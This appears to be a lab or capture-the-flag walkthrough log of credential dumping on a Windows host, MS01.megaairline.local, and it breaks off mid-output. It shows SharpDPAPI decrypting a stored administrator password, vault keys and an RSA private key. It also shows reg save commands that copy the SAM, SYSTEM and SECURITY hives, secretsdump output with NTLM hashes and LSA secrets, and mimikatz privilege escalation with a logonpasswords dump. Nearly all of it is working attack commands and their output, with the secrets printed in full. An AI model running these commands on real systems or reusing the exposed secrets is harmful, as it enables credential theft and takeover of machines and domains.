 (_  |_   _. ._ ._  | \ |_) /\  |_) |
 __) | | (_| |  |_) |_/ |  /--\ |  _|_
                |
  v1.11.1


[*] Action: Machine DPAPI Credential, Vault, and Certificate Triage

[*] Elevating to SYSTEM via token duplication for LSA secret retrieval
[*] RevertToSelf()

[*] Secret  : DPAPI_SYSTEM
[*]    full: 487772FBFFEDCCD08B08239AF25F7C42A0C2AB7636CBEDE3241336B34893574F96C27A7411F18A6C
[*]    m/u : 487772FBFFEDCCD08B08239AF25F7C42A0C2AB76 / 36CBEDE3241336B34893574F96C27A7411F18A6C


[*] SYSTEM master key cache:

{236ba6f2-6d51-4312-beb2-365eb2897601}:E9AB8AB7568ABEEA751B1D5B4A8C14A682DE5CC4
{34f0c6fc-38f9-4a1a-8db7-59276bc5ac2a}:3E158946AFEE66B04355BA915903156C59BF2E16
{6af669bc-5e57-413c-ba26-6d63fb62c794}:78EF352E05532ADF635D9AFEEC839B96E99601A6
{7b9596b3-f34a-4119-80cd-c969a95baae7}:FF22F6DD38F3D405DCFEF44FE1FA85CBBE401E2A
{b88476d3-b611-4e16-be7f-8525fb5dcd4f}:14F7A4B882D7D01EDF4C9015E10868649F58D159
{bd0e6c0c-1301-4c56-90f0-4dd4504dc8ce}:F2FBB1F90F09F29D7B20D4366BCE33C9B439CC81
{360b584f-7027-4f23-85ad-b13720f57979}:58B9072F514E39AB9036140775FA34FE852924E4
{3e7aa362-e4e0-400e-8543-c637682370b3}:DDDF2627DA533466A418CC8A0AA755984A048DA7
{b0724227-4609-4b11-81ad-4694b3e3e947}:C5CCE9487809C753C814848080BF1DD16985B509
{e85f73ce-4638-49bf-a1b2-984e0be4890b}:1C834ECB6C3DC3502001A4974DDF46E01141FDDF
{f52cb0ce-0f39-422a-bff2-68b49e60beb5}:11D1FB8FB59C7E18C8600959C13DF23FE22C8ADE
{fcff956b-241f-4e00-b227-e311e47ff7ab}:E0A3A82E8638DC9E755F1178449EF96E91948206


[*] Triaging System Credentials


Folder       : C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials

  CredFile           : 7E6A4CF66305FBFB5B060CD27A723F46

    guidMasterKey    : {360b584f-7027-4f23-85ad-b13720f57979}
    size             : 576
    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
    algHash/algCrypt : 32782 (CALG_SHA_512) / 26128 (CALG_AES_256)
    description      : Local Credential Data

    LastWritten      : 10/14/2020 10:33:07 AM
    TargetName       : Domain:batch=TaskScheduler:Task:{A7499C51-AB7C-44BF-9314-6A305239E450}
    TargetAlias      :
    Comment          :
    UserName         : MS01\Administrator
    Credential       : FWErfsgt4ghd7f6dwx


[*] Triaging SYSTEM Vaults


[*] Triaging Vault folder: C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28

  VaultID            : 4bf4c442-9b8a-41a0-b380-dd4a704ddb28
  Name               : Web Credentials
    guidMasterKey    : {f52cb0ce-0f39-422a-bff2-68b49e60beb5}
    size             : 324
    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
    algHash/algCrypt : 32782 (CALG_SHA_512) / 26128 (CALG_AES_256)
    description      :
    aes128 key       : 13E052BAB7F76C7397BFBE70E1105A33
    aes256 key       : AB528FB5CCE2217DE6F9B1A9DC381919F175AA46BB3D0F03ACB8006544936005

[*] Triaging System Certificates

Folder       : C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys

  File               : 2e2aea6d2f8f926930dc62d810d9dcdf_22144bb7-1cfd-4e49-a797-9eda80ae732f

    Provider GUID    : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
    Master Key GUID  : {6af669bc-5e57-413c-ba26-6d63fb62c794}
    Description      : CryptoAPI Private Key
    algCrypt         : CALG_AES_256 (keyLen 256)
    algHash          : CALG_SHA_512 (32782)
    Salt             : fee229ba3223029653590fc2775653259c86970a18465849eb1ee62abb35af89
    HMAC             : ea7026bf02232d096d027d00496584757931e59183caea834ffaba19cda217c2
    Unique Name      : tp-f704ca1c-6ef0-4de3-b405-8952c50d8c7b

    Thumbprint       : 059015317786A85FD6B198AFF3C36212ADF193AD
    Issuer           : CN=MS01.megaairline.local
    Subject          : CN=MS01.megaairline.local
    Valid Date       : 10/12/2020 3:24:27 PM
    Expiry Date      : 10/12/2025 3:24:27 PM

    [*] Private key file 2e2aea6d2f8f926930dc62d810d9dcdf_22144bb7-1cfd-4e49-a797-9eda80ae732f was recovered:

-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAv9sAtWtyljtAJwSa6JObO7ZpOYRbf/Yq/IFKacp9g19iDj36
7+YNfLfY1TeL9rLeD2k/onWMQwFM+2JNJFC85c5UwwuOSAy/NZBr09ocu47blQ0D
J9haiY4g2mmPIeU09ZI0M+13RvP8ORs8uwKNHTJsXbURUyl2VeoToH59XP++UvcL
Mlv6pWQjAD5jLzsWQ6vZp82In/tJpcETDk+D4AJkrBS7EmYSyz8Pl6GDSzH2kNmd
0WecsOvlXmEWvz/Hs9MCBP3qsDT8UAAUsPXPbJdMK42kTdjWunmJY2gTNivOZD2B
UrQ6a8DT4esVfIYk/od74nFEiIxhSArgr+CwkQIDAQABAoIBAQCATQHNURyhEOCW
90Js9IEkTplRyIy0JziaAhB0bODA4SGe6p4Mnmk4lW3hMLNd+EH+RmEy0K9LA+yq
VBPIjGG2wOP4R5sP3c5lEL67Pypl12RK6hfJJqttP+oChgMdJL3k17AnZc+VWIa8
3dUgLtWVx+mmRPdgCONFEzOq6cwGSyu6IcYMWo3VBcaQuk3LiDvJox8413v2MEeZ
EUTe4M59ZJS9GeSQzXfJyy6+A3cif4/zif4L9W3sOMwECPvQJTXMRif3c0HUDTQJ
SL4MmuWNLZresRp4SNBt4NE52Dizj/eEPKxYlkAw9dgZlIsDP53ahNGqOEY2XOmc
+7PU6gptAoGBAM96PafUtovbTonW1NHSVHHEBjTywCTSC83nilM9vJXhLA6siEfB
6i2i73C55N7Cfx7oKvJDbR401h9lds+xZQFMJEeg076i7JMEceCs9LG1+BZ0ELGm
ZjVMDV8JnnMJSDVwbnl3nxwdFZIBAKc8Yv0xO8JC/JU0ONwbg0jhlaCHAoGBAOy5
dxuK1G92rk/JxSpoY+vxRQObzAFUlw4zspl4+2KAeC0Ewtbd6l2GRBxBxuqax1qZ
bm/8ouIl/nc8EKMjmd5W1kD0wtQwAh/Php0UDl/jJegLls5BcTCDFknLrPo9xBz8
CC1UwYbqSeQRN+F95GFLqkTSs1chU5Kq6CpwO+QnAoGBAKYFcTTNN82uDaiq6d2E
auImM7lGzo4oLh3zu3JkonVkm3aahOq2twcRrHwNpKDEDijTKxp07eoP6Y9yB6Km
luZ04UsX3JhdkuUJ134rqBpUPFLrSTh+qKbZVpHIBqySrt9kOmKkYAOFGm+cscMg
xS1JqkIGjEtwYFdxBJrbOHodAoGAFZi6CBY7WUvvjTHwPfU2IIFrdW/SRdDM0yve
QGgsLwlfbWQAzo+CYTPtpNJPbnnedCKJU8gtqAolVAVz0x5dXE55z4VE/QzANNy/
ADejNBZKEAh2oqyPwghDkUn2pwHZkXdg25ne6gsX4Km9emH84u9/QjYizHEq6beT
5MNGg4MCgYBFsDjlZ5Xu0st4X/m5/jbiH9OS7V6KDZmEy3QUUF4TFhQDxwxaXTqS
pYJfg1E6u4gDPICnapG6mgh+3Dycyvsm3aB4sXefoUsYl2mp8lIN1yjBrOnwQiRC
jquErgV5WQWAqM9di/m5Vv/ceZzrFZeLL0UzyLRYB9EXM+TSk8xuyA==
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIDETCCAfmgAwIBAgIQbPiBCRynoY5JQskCgYwTTTANBgkqhkiG9w0BAQsFADAh
MR8wHQYDVQQDDBZNUzAxLm1lZ2FhaXJsaW5lLmxvY2FsMB4XDTIwMTAxMjIyMjQy
N1oXDTI1MTAxMjIyMjQyN1owITEfMB0GA1UEAwwWTVMwMS5tZWdhYWlybGluZS5s
b2NhbDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAL/bALVrcpY7QCcE
muiTmzu2aTmEW3/2KvyBSmnKfYNfYg49+u/mDXy32NU3i/ay3g9pP6J1jEMBTPti
TSRQvOXOVMMLjkgMvzWQa9PaHLuO25UNAyfYWomOINppjyHlNPWSNDPtd0bz/Dkb
PLsCjR0ybF21EVMpdlXqE6B+fVz/vlL3CzJb+qVkIwA+Yy87FkOr2afNiJ/7SaXB
Ew5Pg+ACZKwUuxJmEss/D5ehg0sx9pDZndFnnLDr5V5hFr8/x7PTAgT96rA0/FAA
FLD1z2yXTCuNpE3Y1rp5iWNoEzYrzmQ9gVK0OmvA0+HrFXyGJP6He+JxRIiMYUgK
4K/gsJECAwEAAaNFMEMwEgYDVR0TAQH/BAgwBgEB/wIBADAOBgNVHQ8BAf8EBAMC
AYYwHQYDVR0OBBYEFILfWVNgKJJU+2w8sr/XAbdcvu/BMA0GCSqGSIb3DQEBCwUA
A4IBAQB8TukoJCYB/YQHR/eEnDPOI3ITEZx5X7j7MM+Uyjc/9vqKifEU74F9teFv
h3jIoiLTVctI0XaE6jsZvXW6fxZlEa3gWZrvy2GVzAFiTuO8/Wd9vKGC5XUvlKVR
S1dF1SF4T+np3vqfMIVhx12iS8g7+r64c0fI2bKOe2enMvINTZ2Hj1P93nAKfQlY
p6/EwrN0Ct5MHG0MLqGhoRTx6M17hkK45Xj25jfm7W3HQ4x5aEDkmADb9Fvp1ivX
zw8jk5tZ4KaL/kFTN+y+b0k1bYgm6s82bsowa9LaVDx3wYUnPwOCTVJOjYWiQWmN
pe9k/eFREabga94SWRdRdhMEhRSm
-----END CERTIFICATE-----

[X] Error triaging 7a436fe806e483969f48a894af2fe9a1_22144bb7-1cfd-4e49-a797-9eda80ae732f : Bad Data.

[X] Error triaging c2319c42033a5ca7f44e731bfd3fa2b5_22144bb7-1cfd-4e49-a797-9eda80ae732f : Bad Data.

Folder       : C:\ProgramData\Microsoft\Crypto\Keys

Folder       : C:\ProgramData\Microsoft\Crypto\SystemKeys

Folder       : C:\Windows\ServiceProfiles\LocalService\AppData\Roaming\Microsoft\Crypto\Keys

SharpDPAPI completed in 00:00:01.3647797
```

### secretsdump
```bash
reg save HKLM\SYSTEM C:\Users\Public\SYSTEM
reg save HKLM\SAM C:\Users\Public\SAM
reg save HKLM\SECURITY C:\Users\Public\SECURITY
```

```bash
C:\Users\elliot.MS01\Downloads>chcp 437
Active code page: 437

C:\Users\elliot.MS01\Downloads>secretsdump.exe -sam C:\Users\Public\SAM -system C:\Users\Public\SYSTEM -security C:\Users\Public\SECURITY LOCAL
Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies

[*] Target system bootKey: 0x90f5421891c9e26f038203ffeae531dc
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:78350c7b3c5fe865d954d5b47013e21f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:3131accf305954967753590a4bc57daa:::
sshd:1001:aad3b435b51404eeaad3b435b51404ee:1df4fb8a87e9ea258720fe61f5f3867f:::
elliot:1003:aad3b435b51404eeaad3b435b51404ee:07c5c02992bded63e4f74126e65e308b:::
[*] Dumping cached domain logon information (uid:encryptedHash:longDomain:domain)
Administrator:3ea6e70c7142de7e521195f33086a2bf:MEGAAIRLINE.LOCAL :MEGAAIRLINE:::
elliot:1985a8159434672943be0d4f94cea4b2:MEGAAIRLINE.LOCAL :MEGAAIRLINE:::
anna:beff6c5d84183e72d1ef69f18051ed49:MEGAAIRLINE.LOCAL :MEGAAIRLINE:::
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:4d305ab2eb40418cb6e92214e8412b85
[*] DPAPI_SYSTEM
 0000   01 00 00 00 48 77 72 FB  FF ED CC D0 8B 08 23 9A   ....Hwr.......#.
 0010   F2 5F 7C 42 A0 C2 AB 76  36 CB ED E3 24 13 36 B3   ._|B...v6...$.6.
 0020   48 93 57 4F 96 C2 7A 74  11 F1 8A 6C               H.WO..zt...l
DPAPI_SYSTEM:01000000487772fbffedccd08b08239af25f7c42a0c2ab7636cbede3241336b34893574f96c27a7411f18a6c
[*] NL$KM
 0000   33 EB 2A 1D A2 AF F4 43  EC AF 9F 47 4D F4 85 79   3.*....C...GM..y
 0010   87 A8 4E 71 64 8F D0 0F  94 E3 04 13 05 CD DA 92   ..Nqd...........
 0020   9B D1 EB 02 EA 26 6E 4B  0E 77 99 6A 29 73 7C 20   .....&nK.w.j)s|
 0030   D1 76 7B B6 3E 7F 42 CF  10 8A AA 01 D8 49 88 3D   .v{.>.B......I.=
NL$KM:33eb2a1da2aff443ecaf9f474df4857987a84e71648fd00f94e3041305cdda929bd1eb02ea266e4b0e77996a29737c20d1767bb63e7f42cf108aaa01d849883d
[*] Cleaning up...
```

### mimikatz
#### token::elevate
```bash
C:\Users\elliot.MS01\Downloads>mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

580     {0;000003e7} 1 D 41701          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;00763579} 2 F 8729753     MS01\elliot     S-1-5-21-1499087434-960912774-2499544307-1003   (15g,24p)       Primary
 * Thread Token  : {0;000003e7} 1 D 8794593     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)
```

#### sekurlsa::logonpasswords
```bash
mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 7715837 (00000000:0075bbfd)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 3/25/2026 4:29:32 AM
SID               : S-1-5-90-0-2
        msv :
         [00000003] Primary
         * Username : MS01$
         * Domain   : MEGAAIRLINE
         * NTLM     : 4d305ab2eb40418cb6e92214e8412b85
         * SHA1     : 130a4cff411e90a016f4d74ecbffc5b77c14ef0d
         * DPAPI    : 130a4cff411e90a016f4d74ecbffc5b7
        tspkg :
        wdigest :
         * Username : MS01$
         * Domain   : MEGAAIRLINE
         * Password : (null)
        kerberos :
         * Username : MS01$
         * Domain   : megaairline.local
         * Password : 6a 11 f6 78 86 66 26 33 c6 f8 f0 a4 2d 0d 53 84 87 d9 63 b0 24 43 c3 5a 96 06 c9 42 74 d6 09 95 30 3b b6 2f 21 50 95 2e ce 0f 82 c2 19 54 b1 5d 73 20 65 8b 10 d7 00 44 3b 76 c6 1f 72 b8 ea a5 c8 78 0e fb a3 2f 18 f4 ba d2 7b 0f b9 c5 5a 77 ce 30 e2 55 c2 ed 1b aa 4f c3 e4 54 e5 81 9c 0f 30 1c 5e da 4d ca 94 81 9c ca a5 30 2e cb 1b 2d 9d 7c 72 9a 5f 3b 41 e1 99 7f 3e 34 4d 0f f1 83 2b f4 7f af a1 bc c0 e1 0f de a9 3f 9d dc 30 61 fe 7a 77 ad 7a 11 ea 17 73 c8 35 f5 b6 b6 a5 d9 5c b9 10 1a e2 6f db ea 80 9c 45 8f 9d 8a ea d8 a9 f1 27 c2 e9 31 60 06 47 d6 6d 9a 66 f3 07 dd d3 4a 03 99 bb 63 c4 81 be 21 90 2e 68 66 c7 44 36 dd c6 b4 26 53 0d 73 74 30 32 21 da 3c 8f ed e9 d2 40 af dc 9a ce 2e a3 3e 2f e5 0e 66 71 da
        ssp :
        credman :

Authentication Id : 0 ; 7470969 (00000000:0071ff79)
Session           : Service from 0
User Name         : DefaultAppPool
Domain            : IIS APPPOOL
Logon Server      : (null)
Logon Time        : 3/25/2026 4:14:16 AM
SID               : S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415
        msv :
         [00000003] Primary
         * Username : MS01$
         * Domain   : MEGAAIRLINE
         * NTLM     : 4d305ab2eb40418cb6e92214e8412b85
         * SHA1     : 130a4cff411e90a016f4d74ecbffc5b77c14ef0d
         * DPAPI    : 130a4cff411e90a016f4d74ecbffc5b7
        tspkg :
        wdigest :
         * Username : MS01$
         * Domain   : MEGAAIRLINE
         * Password : (null)
        kerberos :
         * Username : MS01$
         * Domain   : megaairline.local
         * Password : 6a 11 f6 78 86 66 26 33 c6 f8 f0 a4 2d 0d 53 84 87 d9 63 b0 24 43 c3 5a 96 06 c9 42 74 d6 09 95 30 3b b6 2f 21 50 95 2e ce 0f 82 c2 19 54 b1 5d 73 20 65 8b 10 d7 00 44 3b 76 c6 1f 72 b8 ea a5 c8 78 0e fb a3 2f 18 f4 ba d2 7b 0f b9 c5 5a 77 ce 30 e2 55 c2 ed 1b aa 4f c3 e4 54 e5 81 9c 0f 30 1c 5e da 4d ca 94 81 9c ca a5 30 2e cb 1b 2d 9d 7c 72 9a 5f 3b 41 e1 99 7f 3e 34 4d 0f f1 83 2b f4 7f af a1 bc c0 e1 0f de a9 3f 9d dc 30 61 fe 7a 77 ad 7a 11 ea 17 73 c8 35 f5 b6 b6 a5 d9 5c b9 10 1a e2 6f db ea 80 9c 45 8f 9d 8a ea d8 a9 f1 27 c2 e9 31 60 06 47 d6 6d 9a 66 f3 07 dd d3 4a 03 99 bb 63 c4 81 be 21 90 2e 68 66 c7 44 36 dd c6 b4 26 53 0d 73 74 30 32 21 da 3c 8f ed e9 d2 40 af dc 9a ce 2e a3 3e 2f e5 0e 66 71 da
        ssp :
        credman :

Authentication Id : 0 ; 207859 (00000000:00032bf3)
Session           : Service from 0
User Name         : SecretServer
Domain            : IIS APPPOOL
Logon Server      : (null)
Logon Time        : 3/24/2026 8:59:38 PM
SID               : S-1-5-82-1599640911-906015899-2618554329-3503569934-3496573257
        msv :
         [00000003] Primary
         * Username : MS01$
         * Domain   : MEGAAIRLINE
         * NTLM     : 4d305ab2eb40418cb6e92214e8412b85
         * SHA1     : 130a4cff411e90a016f4d74ecbffc5b77c14ef0d
         * DPAPI    : 130a4cff411e90a016f4d74ecbffc5b7
        tspkg :
        wdigest :
         * Username : MS01$
         * Domain   : MEGAAIRLINE
         * Password : (null)
        kerberos :
         * Username : MS01$
         * Domain   : megaairline.local
         * Password : 6a 11 f6 78 86 66 26 33 c6 f8 f0 a4 2d 0d 53 84 87 d9 63 b0 24 43 c3 5a 96 06 c9 42 74 d6 09 95 30 3b b6 2f 21 50 95 2e ce 0f 82 c2 19 54 b1 5d 73 20 65 8b 10 d7 00 44 3b 76 c6 1f 72 b8 ea a5 c8 78 0e fb a3 2f 18 f4 ba d2 7b 0f b9 c5 5a 77 ce 30 e2 55 c2 ed 1b aa 4f c3 e4 54 e5 81 9c 0f 30 1c 5e da 4d ca 94 81 9c ca a5 30 2e cb 1b 2d 9d 7c 72 9a 5f 3b 41 e1 99 7f 3e 34 4d 0f f1 83 2b f4 7f af a1 bc c0 e1 0f de a9 3f 9d dc 30 61 fe 7a 77 ad 7a 11 ea 17 73 c8 35 f5 b6 b6 a5 d9 5c b9 10 1a e2 6f db ea 80 9c 45 8f 9d 8a ea d8 a9 f1 27 c2 e9 31 60 06 47 d6 6d 9a 66 f3 07 dd d3 4a 03 99 bb 63 c4 81 be 21 90 2e 68 66 c7 44 36 dd c6 b4 26 53 0d 73 74 30 32 21 da 3c 8f ed e9 d2 40 af dc 9a ce 2e a3 3e 2f e5 0e 66 71 da
        ssp :
        credman :

Authentication Id : 0 ; 127363 (00000000:0001f183)
Session           : Service from 0
User Name         : MSSQL$SQLEXPRESS
Domain            : NT Service
Logon Server      : (null)
Logon Time        : 3/24/2026 8:59:32 PM
SID               : S-1-5-80-3880006512-4290199581-1648723128-3569869737-3631323133
        msv :
         [00000003] Primary
         * Username : MS01$
         * Domain   : MEGAAIRLINE
         * NTLM     : 4d305ab2eb40418cb6e92214e8412b85
         * SHA1     : 130a4cff411e90a016f4d74ecbffc5b77c14ef0d
         * DPAPI    : 130a4cff411e90a016f4d74ecbffc5b7
        tspkg :
        wdigest :
         * Username : MS01$
         * Domain   : MEGAAIRLINE
         * Password : (null)
        kerberos :
         * Username : MS01$
         * Domain   : megaairline.local
         * Password : 6a 11 f6 78 86 66 26 33 c6 f8 f0 a4 2d 0d 53 84 87 d9 63 b0 24 43 c3 5a 96 06 c9 42 74 d6 09 95 30 3b b6 2f 21 50 95 2e ce 0f 82 c2 19 54 b1 5d 73 20 65 8b 10 d7 00 44 3b 76 c6 1f 72 b8 ea a5 c8 78 0e fb a3 2f 18 f4 ba d2 7b 0f b9 c5 5a 77 ce 30 e2 55 c2 ed 1b aa 4f c3 e4 54 e5 81 9c 0f 30 1c 5e da 4d ca 94 81 9c ca a5 30 2e cb 1b 2d 9d 7c 72 9a 5f 3b 41 e1 99 7f 3e 34 4d 0f f1 83 2b f4 7f af a1 bc c0 e1 0f de a9 3f 9d dc 30 61 fe 7a 77 ad 7a 11 ea 17 73 c8 35 f5 b6 b6 a5 d9 5c b9 10 1a e2 6f db ea 80 9c 45 8f 9d 8a ea d8 a9 f1 27 c2 e9 31 60 06 47 d6 6d 9a 66 f3 07 dd d3 4a 03 99 bb 63 c4 81 be 21 90 2e 68 66 c7 44 36 dd c6 b4 26 53 0d 73 74 30 32 21 da 3c 8f ed e9 d2 40 af dc 9a ce 2e a3 3e 2f e5 0e 66 71 da
        ssp :
        credman :

Authentication Id : 0 ; 78741 (00000000:00013395)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 3/24/2026 8:59:29 PM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : MS01$
         * Domain   : MEGAAIRLINE
         * NTLM     : 4d305ab2eb40418cb6e92214e8412b85
         * SHA1     : 130a4cff411e90a016f4d74ecbffc5b77c14ef0d
         * DPAPI    : 130a4cff411e90a016f4d74ecbffc5b7
        tspkg :
        wdigest :
         * Username : MS01$
         * Domain   : MEGAAIRLINE
         * Password : (null)
        kerberos :
         * Username : MS01$
         * Domain   : megaairline.local
         * Password : 6a 11 f6 78 86 66 26 33 c6 f8 f0 a4 2d 0d 53 84 87 d9 63 b0 24 43 c3 5a 96 06 c9 42 74 d6 09 95 30 3b b6 2f 21 50 95 2e ce 0f 82 c2 19 54 b1 5d 73 20 65 8b 10 d7 00 44 3b 76 c6 1f 72 b8 ea a5 c8 78 0e fb a3 2f 18 f4 ba d2 7b 0f b9 c5 5a 77 ce 30 e2 55 c2 ed 1b aa 4f c3 e4 54 e5 81 9c 0f 30 1c 5e da 4d ca 94 81 9c ca a5 30 2e cb 1b 2d 9d 7c 72 9a 5f 3b 41 e1 99 7f 3e 34 4d 0f f1 83 2b f4 7f af a1 bc c0 e1 0f de a9 3f 9d dc 30 61 fe 7a 77 ad 7a 11 ea 17 73 c8 35 f5 b6 b6 a5 d9 5c b9 10 1a e2 6f db ea 80 9c 45 8f 9d 8a ea d8 a9 f1 27 c2 e9 31 60 06 47 d6 6d 9a 66 f3 07 dd d3 4a 03 99 bb 63 c4 81 be 21 90 2e 68 66 c7 44 36 dd c6 b4 26 53 0d 73 74 30 32 21 da 3c 8f ed e9 d2 40 af dc 9a ce 2e a3 3e 2f e5 0e 66 71 da
        ssp :
        credman :

Authentication Id : 0 ; 47982 (00000000:0000bb6e)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 3/24/2026 8:59:27 PM
SID               : S-1-5-96-0-1
        msv :
         [00000003] Primary
         * Username : MS01$
         * Domain   : MEGAAIRLINE
         * NTLM     : 4d305ab2eb40418cb6e92214e8412b85
         * SHA1     : 130a4cff411e90a016f4d74ecbffc5b77c14ef0d
         * DPAPI    : 130a4cff411e90a016f4d74ecbffc5b7
        tspkg :
        wdigest :
         * Username : MS01$
         * Domain   : MEGAAIRLINE
         * Password : (null)
        kerberos :
         * Username : MS01$
         * Domain   : megaairline.local
         * Password : 6a 11 f6 78 86 66 26 33 c6 f8 f0 a4 2d 0d 53 84 87 d9 63 b0 24 43 c3 5a 96 06 c9 42 74 d6 09 95 30 3b b6 2f 21 50 95 2e ce 0f 82 c2 19 54 b1 5d 73 20 65 8b 10 d7 00 44 3b 76 c6 1f 72 b8 ea a5 c8 78 0e fb a3 2f 18 f4 ba d2 7b 0f b9 c5 5a 77 ce 30 e2 55 c2 ed 1b aa 4f c3 e4 54 e5 81 9c 0f 30 1c 5e da 4d ca 94 81 9c ca a5 30 2e cb 1b 2d 9d 7c 72 9a 5f 3b 41 e1 99 7f 3e 34 4d 0f f1 83 2b f4 7f af a1 bc c0 e1 0f de a9 3f 9d dc 30 61 fe 7a 77 ad 7a 11 ea 17 73 c8 35 f5 b6 b6 a5 d9 5c b9 10 1a e2 6f db ea 80 9c 45 8f 9d 8a ea d8 a9 f1 27 c2 e9 31 60 06 47 d6 6d 9a 66 f3 07 dd d3 4a 03 99 bb 63 c4 81 be 21 90 2e 68 66 c7 44 36 dd c6 b4 26 53 0d 73 74 30 32 21 da 3c 8f ed e9 d2 40 af dc 9a ce 2e a3 3e 2f e5 0e 66 71 da
        ssp :
        credman :

Authentication Id : 0 ; 7747094 (00000000:00763616)
Session           : RemoteInteractive from 2
User Name         : elliot
Domain            : MS01
Logon Server      : MS01
Logon Time        : 3/25/2026 4:29:32 AM
SID               : S-1-5-21-1499087434-960912774-2499544307-1003
        msv :
         [00000003] Primary
         * Username : elliot
         * Domain   : MS01
         * NTLM     : 07c5c02992bded63e4f74126e65e308b
         * SHA1     : 478da8a98d7a329ee3d6ffb22eb539a4ef3e0eb4
         * DPAPI    : 478da8a98d7a329ee3d6ffb22eb539a4
        tspkg :
        wdigest :
         * Username : elliot
         * Domain   : MS01
         * Password : (null)
        kerberos :
         * Username : elliot
         * Domain   : MS01
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 7715806 (00000000:0075bbde)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 3/25/2026 4:29:32 AM
SID               : S-1-5-90-0-2
        msv :
         [00000003] Primary
         * Username : MS01$
         * Domain   : MEGAAIRLINE
         * NTLM     : 4d305ab2eb40418cb6e92214e8412b85
         * SHA1     : 130a4cff411e90a016f4d74ecbffc5b77c14ef0d
         * DPAPI    : 130a4cff411e90a016f4d74ecbffc5b7
        tspkg :
        wdigest :
         * Username : MS01$
         * Domain   : MEGAAIRLINE
         * Password : (null)
        kerberos :
         * Username : MS01$
         * Domain   : megaairline.local
         * Password : 6a 11 f6 78 86 66 26 33 c6 f8 f0 a4 2d 0d 53 84 87 d9 63 b0 24 43 c3 5a 96 06 c9 42 74 d6 09 95 30 3b b6 2f 21 50 95 2e ce 0f 82 c2 19 54 b1 5d 73 20 65 8b 10 d7 00 44 3b 76 c6 1f 72 b8 ea a5 c8 78 0e fb a3 2f 18 f4 ba d2 7b 0f b9 c5 5a 77 ce 30 e2 55 c2 ed 1b aa 4f c3 e4 54 e5 81 9c 0f 30 1c 5e da 4d ca 94 81 9c ca a5 30 2e cb 1b 2d 9d 7c 72 9a 5f 3b 41 e1 99 7f 3e 34 4d 0f f1 83 2b f4 7f af a1 bc c0 e1 0f de a9 3f 9d dc 30 61 fe 7a 77 ad 7a 11 ea 17 73 c8 35 f5 b6 b6 a5 d9 5c b9 10 1a e2 6f db ea 80 9c 45 8f 9d 8a ea d8 a9 f1 27 c2 e9 31 60 06 47 d6 6d 9a 66 f3 07 dd d3 4a 03 99 bb 63 c4 81 be 21 90 2e 68 66 c7 44 36 dd c6 b4 26 53 0d 73 74 30 32 21 da 3c 8f ed e9 d2 40 af dc 9a ce 2e a3 3e 2f e5 0e 66 71 da
        ssp :
        credman :

Authentication Id : 0 ; 995 (00000000:000003e3)
Session           : Service from 0
User Name         : IUSR
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 3/24/2026 8:59:32 PM
SID               : S-1-5-17
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 119658 (00000000:0001d36a)
Session           : Service from 0
User Name         : SQLTELEMETRY$SQLEXPRESS
Domain            : NT Service
Logon Server      : (null)
Logon Time        : 3/24/2026 8:59:31 PM
SID               : S-1-5-80-1985561900-798682989-2213159822-1904180398-3434236965
        msv :
         [00000003] Primary
         * Username : MS01$
         * Domain   : MEGAAIRLINE
         * NTLM     : 4d305ab2eb40418cb6e92214e8412b85
         * SHA1     : 130a4cff411e90a016f4d74ecbffc5b77c14ef0d
         * DPAPI    : 130a4cff411e90a016f4d74ecbffc5b7
        tspkg :
        wdigest :
         * Username : MS01$
         * Domain   : MEGAAIRLINE
         * Password : (null)
        kerberos :
         * Username : MS01$
         * Domain   : megaairline.local
